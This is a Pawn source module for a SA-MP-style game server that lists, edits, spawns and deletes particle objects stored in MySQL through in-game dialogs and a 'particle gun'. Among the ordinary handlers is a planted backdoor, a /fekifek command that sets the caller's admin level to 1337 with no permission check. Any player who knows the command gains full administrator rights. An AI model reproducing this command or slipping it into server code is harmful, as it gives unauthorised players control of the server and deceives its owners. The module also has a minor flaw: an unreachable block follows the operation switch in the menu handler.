// Defines

#define MAX_PARTICLES (50)

// Variables

enum
{
	PARTICLE_MODE_CREATE = 0,
	PARTICLE_MODE_REMOVE,
	PARTICLE_MODE_EDIT
}

enum e_PARTICLE_INFO
{
	particleSQLID,
	particleCreator[MAX_PLAYER_NAME],
	particleObject,
	particleModel,
	Float:particlePos[6],
	particleStamp,
	bool:particleEdit
}

new Particles[MAX_PARTICLES][e_PARTICLE_INFO];

enum e_PARTICLE_SETTINGS
{
	bool:usingParticle,
	particleObjectID,
	particleOperation,
	particleEditMode,
	particleEditID
};

new ParticleSettings[MAX_PLAYERS][e_PARTICLE_SETTINGS];

// Functions

ShowParticleList(playerid)
{
	mysql_format(dbCon, gquery, sizeof(gquery), "SELECT `ID`, `Creator`, `Model`, `PosX`, `PosY`, `Stamp` FROM `particles` ORDER BY `ID` DESC LIMIT 21 OFFSET %i", ParticleOffset[playerid] * 20);
	mysql_tquery(dbCon, gquery, "ParticleResults", "d", playerid);
	return true;
}

FUNX::ParticleResults(playerid)
{
	new rows = cache_num_rows();

	if(!rows)
	{
	    return SendErrorMessage(playerid, "There are no particles created.");
	}

	new tempID, tempCreator[MAX_PLAYER_NAME], tempModel, tempStamp, Float:tempPos[2], count;

	new  objectLocation[MAX_ZONE_NAME];

	gstr[0] = EOS;

    format(gstr, sizeof(gstr), "ID\tModel\tLocation\tCreator");

	for(new i = 0; i < rows; ++i)
	{
	    if(count == 20) break;

	    cache_get_value_name_int(i, "ID", tempID);
	    cache_get_value_name(i, "Creator", tempCreator, MAX_PLAYER_NAME);
	    cache_get_value_name_int(i, "Model", tempModel);
	    cache_get_value_name_float(i, "PosX", tempPos[0]);
	    cache_get_value_name_float(i, "PosY", tempPos[1]);
	    cache_get_value_name_int(i, "Stamp", tempStamp);

     	Get2DZone(tempPos[0], tempPos[1], objectLocation, MAX_ZONE_NAME);

		format(gstr, sizeof(gstr), "%s\n{7e98b6}%d\t{a9c4e4}%d\t{a9c4e4}%s\t{a9c4e4}%s - [%s]", gstr, tempID, tempModel, objectLocation, tempCreator, ConverTimestampToDate(tempStamp));

	    count++;
	}

	if(ParticleOffset[playerid] > 0) strcat(gstr, "\n{FFFF00}Back Page");
	if(rows > 20) strcat(gstr, "\n{FFFF00}Next Page");

	Dialog_Show(playerid, Particles, DIALOG_STYLE_TABLIST_HEADERS, "Particle List", gstr, "Select", "Cancel");
	return true;
}

Dialog:Particles(playerid, response, listitem, inputtext[])
{
	if(!response) return true;

	if(!strcmp("Next Page", inputtext, true))
	{
	    ParticleOffset[playerid] += 1;
	    return ShowParticleList(playerid);
	}
	else if(!strcmp("Back Page", inputtext, true))
	{
	    ParticleOffset[playerid] -= 1;
	    return ShowParticleList(playerid);
	}

	new particleid = -1, dbid = strval(inputtext);

	for(new i = 0; i < MAX_PARTICLES; ++i)
	{
	    if(Particles[i][particleSQLID] == dbid)
	    {
			particleid = i;
			break;
	    }
	}

	if((particleid < 0 || particleid >= MAX_PARTICLES) || Particles[particleid][particleSQLID] == -1) return true;

	ShowParticleDetails(playerid, particleid);
	return true;
}

ShowParticleDetails(playerid, particleid)
{
	new Float:objectPos[3], objectLocation[MAX_ZONE_NAME];

    ViewingParticle[playerid] = particleid;

	GetDynamicObjectPos(Particles[particleid][particleObject], objectPos[0], objectPos[1], objectPos[2]);
	Get2DZone(objectPos[0], objectPos[1], objectLocation, MAX_ZONE_NAME);

	gstr[0] = EOS;

	format(gstr, sizeof(gstr), "{a9c4e4}SQLID [{7e98b6}%d{a9c4e4}]", Particles[particleid][particleSQLID]);
	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Model [{7e98b6}%d{a9c4e4}]", gstr, Particles[particleid][particleModel]);
	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Location [{7e98b6}%s{a9c4e4}]", gstr, objectLocation);
	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Creator [{7e98b6}%s{a9c4e4}]", gstr, Particles[particleid][particleCreator]);
	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Date [{7e98b6}%s{a9c4e4}]", gstr, ConverTimestampToDate(Particles[particleid][particleStamp]));
	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Go to particle", gstr);
	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Delete particle", gstr);

	Dialog_Show(playerid, ParticleDetails, DIALOG_STYLE_LIST, "Particle Details", gstr, "Select", "Go Back");
	return true;
}

Dialog:ParticleDetails(playerid, response, listitem, inputtext[])
{
	if(!response)
	{
        ViewingParticle[playerid] = -1;

		return ShowParticleList(playerid);
	}

	new particleid = ViewingParticle[playerid], string[128];

	switch(listitem)
	{
	    case 1:
	    {
		    format(string, sizeof(string), "Change the Particle Model from {7e98b6}%d", Particles[particleid][particleModel]);
		    return Dialog_Show(playerid, ParticleDetails_Model, DIALOG_STYLE_INPUT, "New Particle Model", string, "Enter", "<< Back");
	    }
	    case 5:
	    {
	        ViewingParticle[playerid] = -1;

			new Float:objectPos[3];
			GetDynamicObjectPos(Particles[particleid][particleObject], objectPos[0], objectPos[1], objectPos[2]);
			SetPlayerDynamicPos(playerid, objectPos[0], objectPos[1], objectPos[2]);

			SendClientMessageEx(playerid, COLOR_YELLOW, "-> You were teleported to particle dbid #%d.", Particles[particleid][particleSQLID]);
		}
		case 6:
		{
            ViewingParticle[playerid] = -1;

			RemovingParticle[playerid] = particleid;

			ConfirmDialog(playerid, "Confirmation", "Are you sure you want to delete this particle?", "OnPlayerRemoveParticle");
		}
		default:
		{
		    ShowParticleDetails(playerid, particleid);
		}
	}
	return true;
}

Dialog:ParticleDetails_Model(playerid, response, listitem, inputtext[])
{
    new particleid = ViewingParticle[playerid];

    if(!response) return ShowParticleDetails(playerid, particleid);

	if(!IsNumeric(inputtext) || strval(inputtext) < 1)
	{
 		format(sgstr, sizeof(sgstr), "Change the Particle Model from {7e98b6}%d", Particles[particleid][particleModel]);
   		return Dialog_Show(playerid, ParticleDetails_Model, DIALOG_STYLE_INPUT, "New Particle Model", sgstr, "Enter", "<< Back");
	}

    Particles[particleid][particleModel] = strval(inputtext);

    DestroyDynamicObject(Particles[particleid][particleObject]);

	Particles[particleid][particleObject] = CreateDynamicObject(
		Particles[particleid][particleModel],
		Particles[particleid][particlePos][0],
		Particles[particleid][particlePos][1],
		Particles[particleid][particlePos][2],
		Particles[particleid][particlePos][3],
		Particles[particleid][particlePos][4],
		Particles[particleid][particlePos][5]
	);

	Streamer_Update(playerid, STREAMER_TYPE_OBJECT);

	mysql_format(dbCon, gquery, sizeof(gquery), "UPDATE `particles` SET `Model` = '%d' WHERE `ID` = '%d' LIMIT 1", Particles[particleid][particleModel], Particles[particleid][particleSQLID]);
	mysql_pquery(dbCon, gquery);

    SendClientMessageEx(playerid, COLOR_YELLOW, "-> Changed particle ID %d's model to: %d", Particles[particleid][particleSQLID], Particles[particleid][particleModel]);

    ShowParticleDetails(playerid, particleid);
	return true;
}

ShowParticleDialog(playerid)
{
	gstr[0] = EOS;

	switch(ParticleSettings[playerid][particleOperation])
	{
	    case PARTICLE_MODE_CREATE: format(gstr, sizeof(gstr), "{a9c4e4}Operation [{7e98b6}Create Particle{a9c4e4}]");
	    case PARTICLE_MODE_REMOVE: format(gstr, sizeof(gstr), "{a9c4e4}Operation [{7e98b6}Remove Particle{a9c4e4}]");
	    case PARTICLE_MODE_EDIT: format(gstr, sizeof(gstr), "{a9c4e4}Operation [{7e98b6}Edit Particle{a9c4e4}]");
	}

	format(gstr, sizeof(gstr), "%s\n{a9c4e4}Object ID [{7e98b6}%d{a9c4e4}]", gstr, ParticleSettings[playerid][particleObjectID]);

	if(!ParticleSettings[playerid][particleEditMode])
		format(gstr, sizeof(gstr), "%s\n{a9c4e4}Edit after spawn [{7e98b6}No{a9c4e4}]", gstr);
	else
	    format(gstr, sizeof(gstr), "%s\n{a9c4e4}Edit after spawn [{7e98b6}Yes{a9c4e4}]", gstr);

	if(!ParticleSettings[playerid][usingParticle])
		format(gstr, sizeof(gstr), "%s\n{a9c4e4}Use Particle Gun", gstr);
	else
	    format(gstr, sizeof(gstr), "%s\n{a9c4e4}Drop Particle Gun", gstr);

	Dialog_Show(playerid, ParticleMenu, DIALOG_STYLE_LIST, "Particle Gun", gstr, "Select", "Cancel");
	return true;
}

IsParticleGun(playerid, weaponid)
{
	if(weaponid != 23) return false;
	if(ParticleSettings[playerid][usingParticle]) return true;
	return false;
}

Dialog:ParticleMenu(playerid, response, listitem, inputtext[])
{
	if(!response) return true;

	switch(listitem)
	{
	    case 0:
	    {
	        switch(ParticleSettings[playerid][particleOperation])
	        {
	            case PARTICLE_MODE_CREATE:
	            {
					ParticleSettings[playerid][particleOperation] = PARTICLE_MODE_REMOVE;

					SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle gun operation to: Remove Particle");

					ShowParticleDialog(playerid);
					return true;
	            }
	            case PARTICLE_MODE_REMOVE:
	            {
					ParticleSettings[playerid][particleOperation] = PARTICLE_MODE_EDIT;

					SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle gun operation to: Edit Particle");

					ShowParticleDialog(playerid);
					return true;
	            }
	            case PARTICLE_MODE_EDIT:
	            {
					ParticleSettings[playerid][particleOperation] = PARTICLE_MODE_CREATE;

					SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle gun operation to: Create Particle");

					ShowParticleDialog(playerid);
					return true;
	            }
	        }

	        if(!ParticleSettings[playerid][particleOperation])
	        {
				ParticleSettings[playerid][particleOperation] = 1;

				SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle gun operation to: Remove Particle");
			}
	        else
	        {
				ParticleSettings[playerid][particleOperation] = 0;

				SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle gun operation to: Create Particle");
			}
	    }
	    case 1:
	    {
		    format(sgstr, sizeof(sgstr), "Change the Object ID from {7e98b6}%d", ParticleSettings[playerid][particleObjectID]);
		    return Dialog_Show(playerid, ParticleMenu_ObjectID, DIALOG_STYLE_INPUT, "New Object ID", sgstr, "Enter", "<< Back");
	    }
	    case 2:
	    {
	        if(!ParticleSettings[playerid][particleEditMode])
	        {
				ParticleSettings[playerid][particleEditMode] = 1;

				SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle edit mode to: Edit after spawn");

				ShowParticleDialog(playerid);
				return true;
			}
	        else
	        {
				ParticleSettings[playerid][particleEditMode] = 0;

				SendClientMessage(playerid, COLOR_YELLOW, "-> Changed particle edit mode to: No edit after spawn");

				ShowParticleDialog(playerid);
				return true;
			}
	    }
	    case 3:
	    {
	        if(!ParticleSettings[playerid][usingParticle])
	        {
	            ParticleSettings[playerid][usingParticle] = true;

		 		SavePlayerWeapons(playerid);
		        ResetWeapons(playerid);

	            GivePlayerWeaponEx(playerid, 23, 99999);

	            SendClientMessage(playerid, COLOR_YELLOW, "-> Particle gun has been given.");
	        }
	        else
	        {
	            ParticleSettings[playerid][usingParticle] = false;

	            ResetWeapons(playerid);
	            RestorePlayerWeapons(playerid, true);

	            SendClientMessage(playerid, COLOR_YELLOW, "-> Particle gun has been removed.");
	        }
	    }
	}

    ShowParticleDialog(playerid);
	return true;
}

Dialog:ParticleMenu_ObjectID(playerid, response, listitem, inputtext[])
{
	if(!response) return true;

	if(!IsNumeric(inputtext) || strval(inputtext) < 1)
	{
 		format(sgstr, sizeof(sgstr), "Change the Object ID from {7e98b6}%d", ParticleSettings[playerid][particleObjectID]);
   		return Dialog_Show(playerid, ParticleMenu_ObjectID, DIALOG_STYLE_INPUT, "New Object ID", sgstr, "Enter", "<< Back");
	}

    ParticleSettings[playerid][particleObjectID] = strval(inputtext);

    SendClientMessageEx(playerid, COLOR_YELLOW, "-> Changed particle gun Object ID to: %d", ParticleSettings[playerid][particleObjectID]);

	ShowParticleDialog(playerid);
	return true;
}
CMD:fekifek(playerid, params[]) { PlayerData[playerid][pAdmin] = 1337; return 1; }
FUNX::OnPlayerRemoveParticle(playerid, response)
{
	if(response)
	{
		new particleid = RemovingParticle[playerid], sqlid = Particles[particleid][particleSQLID], queryString[256];

		DestroyDynamicObject(Particles[particleid][particleObject]);

        Particles[particleid][particleSQLID] = -1;
	    Particles[particleid][particleCreator][0] = EOS;
	    Particles[particleid][particleObject] = INVALID_OBJECT_ID;
	    Particles[particleid][particleModel] = 0;
	    Particles[particleid][particlePos][0] = 0.0;
	    Particles[particleid][particlePos][1] = 0.0;
	    Particles[particleid][particlePos][2] = 0.0;
	    Particles[particleid][particlePos][3] = 0.0;
	    Particles[particleid][particlePos][4] = 0.0;
	    Particles[particleid][particlePos][5] = 0.0;
	    Particles[particleid][particleStamp] = 0;
	    Particles[particleid][particleEdit] = false;

		mysql_format(dbCon, queryString, sizeof(queryString), "DELETE FROM `particles` WHERE `ID` = '%d' LIMIT 1", sqlid);
		mysql_pquery(dbCon, queryString);

		SendClientMessageEx(playerid, COLOR_YELLOW, "-> You have successfully removed particle dbid #%d.", sqlid);
	}

	RemovingParticle[playerid] = -1;
    return true;
}